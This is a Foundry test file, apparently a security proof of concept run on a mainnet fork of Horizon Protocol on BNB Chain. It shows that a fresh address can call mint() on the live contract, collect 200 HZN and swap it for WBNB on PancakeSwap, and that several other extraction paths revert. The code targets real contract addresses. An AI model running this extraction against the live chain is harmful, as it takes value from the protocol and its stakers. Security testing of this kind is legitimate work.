// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/// Horizon Protocol (BSC) — live extraction PoC (fork only, read-only on mainnet).
/// Proves: (1) Synthetix.mint() is live and pays the caller 200 HZN;
///         (2) the 200 HZN is sellable for WBNB on PancakeSwap V2 (realizable value);
///         (3) every other candidate extraction path reverts / pays nothing.
contract HorizonPoC is Test {
    // Core
    address constant HZN_PROXY   = 0xC0eFf7749b125444953ef89682201Fb8c6A917CD;
    address constant SNX_TARGET  = 0x0110bcBEB89a43Ec47E62d1980e29e0683745ffc;
    // Staking
    address constant LP_STAKING  = 0x84838d0AB37857fAd5979Fcf6BDDf8ddb1cC1dA8;
    address constant HZN_STAKING = 0x67D5a94F444DF4bBA254645065a4137fc665Bf98;
    // Synths
    address constant ZUSD        = 0x7F11125A2f22e1DCc19213475267D2dD2f838FF5;
    address constant ZBNB        = 0x56A1cE3d81Fcf5c5F716f79396F1BC91eEeAd5Ac;
    // System modules
    address constant REDEEMER    = 0x05AF42bFccD27b0db5697C4a34B8D1aa73f4F186;
    address constant REWD_DIST   = 0xceb4976140994BFB83F29DFbb80Bb2d9fC719dac;
    address constant LIQUIDATOR  = 0x2a7B78b705ea48d278D673e80c880D7EB479F44C;
    address constant CMS         = 0xC7938C1f716E2424915685920f4e8Bc4ff7BAFB8;
    address constant FEEPOOL     = 0xb80f834Ff243Cb66a48F2Fe9E37064db0cD9d6Fd;
    address constant DEPOT       = 0x9B957b4a90287ebB33fAAd9C15199Ed9C17d114d;
    address constant LIQ_REWARDS = 0x05178294eDD61BA3f6A78eF419165AD4d0124362;
    // DEX
    address constant WBNB        = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD        = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant USDT        = 0x55d398326f99059fF775485246999027B3197955;
    address constant BTCB        = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address constant ROUTER      = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant FACTORY     = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address constant HZN_BNB_PAIR= 0xDc9a574b9B341D4a98cE29005b614e1E27430E74;
    address constant ZUSD_BUSD_PAIR = 0xc3bF4E0EA6b76C8eDd838E14BE2116C862C88bdf;

    // Pinned verification block (local reads); CI forks at latest because public RPCs prune old state.
    uint256 constant FORK_BLOCK = 127_685_324;
    address attacker;

    function setUp() public {
        string memory rpc = vm.envOr("BSC_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://bsc-rpc.publicnode.com";
        uint256 forkBlock = vm.envOr("FORK_BLOCK", uint256(0));
        if (forkBlock == 0) {
            // latest block (public RPCs prune old state)
            try vm.createSelectFork(rpc) {
            } catch {
                vm.createSelectFork("https://bsc-dataseed2.defibit.io");
            }
        } else {
            try vm.createSelectFork(rpc, forkBlock) {
            } catch {
                vm.createSelectFork("https://bsc-dataseed2.defibit.io", forkBlock);
            }
        }
        attacker = makeAddr("freshAttacker");
        vm.deal(attacker, 1 ether); // gas money only
    }

    // ---------- helpers ----------
    function _bal(address token, address who) internal view returns (uint256) {
        (bool ok, bytes memory d) = token.staticcall(abi.encodeWithSelector(0x70a08231, who));
        require(ok, "balanceOf failed");
        return abi.decode(d, (uint256));
    }

    // ---------- TEST 1: mint() is live and pays 200 HZN (must call the TARGET, not the proxy) ----------
    function test_mint_live_extraction() public {
        assertEq(_bal(HZN_PROXY, attacker), 0, "attacker starts with 0 HZN");

        vm.prank(attacker);
        uint256 gasBefore = gasleft();
        (bool ok, bytes memory ret) = SNX_TARGET.call(abi.encodeWithSignature("mint()"));
        uint256 gasUsed = gasBefore - gasleft();
        require(ok, "mint reverted");
        assertTrue(abi.decode(ret, (bool)), "mint returned false");

        uint256 minted = _bal(HZN_PROXY, attacker);
        emit log_named_uint("HZN received by fresh attacker", minted);
        emit log_named_uint("gas used by mint()", gasUsed);
        assertEq(minted, 200e18, "minter reward must be 200 HZN");
    }

    // ---------- TEST 1b: calling mint() via the ProxyERC20 pays the proxy (reward gets stuck) ----------
    function test_mint_via_proxy_pays_proxy() public {
        uint256 proxyBefore = _bal(HZN_PROXY, HZN_PROXY);
        vm.prank(attacker);
        (bool ok,) = HZN_PROXY.call(abi.encodeWithSignature("mint()"));
        require(ok, "mint via proxy reverted");
        assertEq(_bal(HZN_PROXY, attacker), 0, "attacker gets nothing via proxy");
        assertEq(_bal(HZN_PROXY, HZN_PROXY), proxyBefore + 200e18, "proxy keeps the reward (stuck)");
    }

    // ---------- TEST 2: the 200 HZN is realizable in WBNB via PancakeSwap ----------
    function test_mint_reward_sellable_for_wbnb() public {
        vm.prank(attacker);
        SNX_TARGET.call(abi.encodeWithSignature("mint()"));
        uint256 hzn = _bal(HZN_PROXY, attacker);
        assertEq(hzn, 200e18);

        // attacker approves router
        vm.startPrank(attacker);
        HZN_PROXY.call(abi.encodeWithSignature("approve(address,uint256)", ROUTER, hzn));
        address[] memory path = new address[](2);
        path[0] = HZN_PROXY;
        path[1] = WBNB;
        uint256 wbnbBefore = _bal(WBNB, attacker);
        (bool ok,) = ROUTER.call(abi.encodeWithSignature(
            "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
            hzn, 0, path, attacker, block.timestamp + 300));
        vm.stopPrank();
        require(ok, "swap failed");
        uint256 gained = _bal(WBNB, attacker) - wbnbBefore;
        emit log_named_uint("WBNB (ERC20) out for 200 HZN (wei)", gained);
        assertGt(gained, 0, "reward is sellable");
    }

    // ---------- TEST 3: issuance / burn blocked by invalid HZN rate ----------
    function test_issuance_blocked() public {
        vm.prank(attacker);
        (bool ok, bytes memory ret) = HZN_PROXY.call(abi.encodeWithSignature("issueMaxSynths()"));
        assertFalse(ok, "issueMaxSynths must revert");
        emit log_named_bytes("issueMaxSynths revert", ret);

        vm.prank(attacker);
        (ok, ret) = HZN_PROXY.call(abi.encodeWithSignature("burnSynths(uint256)", 1e18));
        assertFalse(ok, "burnSynths must revert");
        emit log_named_bytes("burnSynths revert", ret);

        vm.prank(attacker);
        (ok, ret) = HZN_PROXY.call(abi.encodeWithSignature("claimFees()"));
        assertFalse(ok, "claimFees must revert");
        emit log_named_bytes("claimFees revert", ret);
    }

    // ---------- TEST 4: liquidations blocked ----------
    function test_liquidations_blocked() public {
        vm.prank(attacker);
        (bool ok, bytes memory ret) = LIQUIDATOR.call(
            abi.encodeWithSignature("flagAccountForLiquidation(address)", attacker));
        assertFalse(ok, "flagAccountForLiquidation must revert (invalid HZN rate)");
        emit log_named_bytes("flag revert", ret);

        vm.prank(attacker);
        (ok, ret) = HZN_PROXY.call(
            abi.encodeWithSignature("liquidateDelinquentAccount(address)", attacker));
        assertFalse(ok, "liquidateDelinquentAccount must revert");
        emit log_named_bytes("liquidate revert", ret);
    }

    // ---------- TEST 5: no deprecated synths to redeem ----------
    function test_synth_redeemer_dead() public {
        vm.prank(attacker);
        (bool ok,) = REDEEMER.call(abi.encodeWithSignature("redeem(address)", ZUSD));
        assertFalse(ok, "SynthRedeemer.redeem must revert (nothing deprecated)");
    }

    // ---------- TEST 6: rewards distribution is authority-only ----------
    function test_distribution_authority_only() public {
        vm.prank(attacker);
        (bool ok, bytes memory ret) = REWD_DIST.call(
            abi.encodeWithSignature("distributeRewards(uint256)", 1e18));
        assertFalse(ok, "distributeRewards must revert for non-authority");
        emit log_named_bytes("distributeRewards revert", ret);
    }

    // ---------- TEST 7: no short loans to liquidate ----------
    function test_no_short_loans() public view {
        (bool ok, bytes memory d) = CMS.staticcall(abi.encodeWithSignature("totalLoans()"));
        require(ok);
        assertEq(abi.decode(d, (uint256)), 0, "no loans => nothing to liquidate");
    }

    // ---------- TEST 8: fresh staker earns zero ----------
    function test_fresh_staker_zero_rewards() public {
        (bool ok, bytes memory d) = LP_STAKING.staticcall(
            abi.encodeWithSignature("earned(address)", attacker));
        require(ok);
        assertEq(abi.decode(d, (uint256)), 0, "fresh account earns 0");

        uint256 before = _bal(HZN_PROXY, attacker);
        vm.prank(attacker);
        LP_STAKING.call(abi.encodeWithSignature("getReward()"));
        assertEq(_bal(HZN_PROXY, attacker), before, "getReward pays nothing to fresh account");
    }

    // ---------- TEST 9: exchange works but synths have no DEX exit ----------
    function test_exchange_works_but_no_exit_market() public {
        // zUSD-BUSD pair holds zUSD; simulate as if it called exchange
        address holder = ZUSD_BUSD_PAIR;
        vm.prank(holder);
        (bool ok, bytes memory ret) = HZN_PROXY.call(abi.encodeWithSignature(
            "exchange(bytes32,uint256,bytes32)", bytes32("zUSD"), 100e18, bytes32("zBNB")));
        require(ok, "exchange must work");
        uint256 out = abi.decode(ret, (uint256));
        emit log_named_uint("zBNB received for 100 zUSD", out);
        assertGt(out, 0, "exchange live");

        // prove there is no PancakeSwap V2 pair for zBNB against any major quote asset
        address[4] memory quotes = [WBNB, BUSD, USDT, BTCB];
        for (uint i = 0; i < 4; i++) {
            (bool ok2, bytes memory d2) = FACTORY.staticcall(
                abi.encodeWithSignature("getPair(address,address)", ZBNB, quotes[i]));
            require(ok2);
            assertEq(abi.decode(d2, (address)), address(0), "no zBNB market");
        }
    }

    // ---------- TEST 10: what a mint() actually distributes (context) ----------
    function test_mint_distribution_context() public {
        uint256 rateBefore = _u(LP_STAKING, "rewardRate()");
        vm.prank(attacker);
        SNX_TARGET.call(abi.encodeWithSignature("mint()"));
        uint256 rateAfter = _u(LP_STAKING, "rewardRate()");
        uint256 periodFinish = _u(LP_STAKING, "periodFinish()");
        emit log_named_uint("LP staking rewardRate before", rateBefore);
        emit log_named_uint("LP staking rewardRate after", rateAfter);
        emit log_named_uint("LP staking periodFinish after", periodFinish);
        // existing stakers hold 83.6% of LP supply: they capture most of the 50k HZN
        uint256 staked = _u(LP_STAKING, "totalSupply()");
        emit log_named_uint("LP staked (existing, wei)", staked);
    }

    function _u(address to, string memory sig) internal view returns (uint256) {
        (bool ok, bytes memory d) = to.staticcall(abi.encodeWithSignature(sig));
        require(ok, sig);
        return abi.decode(d, (uint256));
    }
}
